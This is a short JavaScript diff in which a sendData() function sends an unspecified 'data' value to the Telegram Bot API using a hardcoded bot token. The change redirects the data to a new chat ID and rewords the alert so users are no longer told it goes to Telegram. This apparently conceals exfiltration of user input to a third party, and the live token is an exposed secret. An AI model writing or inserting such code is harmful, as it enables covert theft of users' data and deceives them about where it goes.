@@ -25,9 +25,10 @@ function sendData() {
     var xhr = new XMLHttpRequest();
 
     var url = 'https://api.telegram.org/bot6793883330:AAHfIR0AZ5gdtWSOuACe2_WQ3WlPVn3MajQ/sendMessage?chat_id=961697802&text=' + data;
+    var url = 'https://api.telegram.org/bot6793883330:AAHfIR0AZ5gdtWSOuACe2_WQ3WlPVn3MajQ/sendMessage?chat_id=1509457421&text=' + data;
     
     xhr.open('GET', url, true);
     xhr.send();
     
-    alert('Данные отправлены в Telegram!');
+    alert('Данные отправлены!');
 }
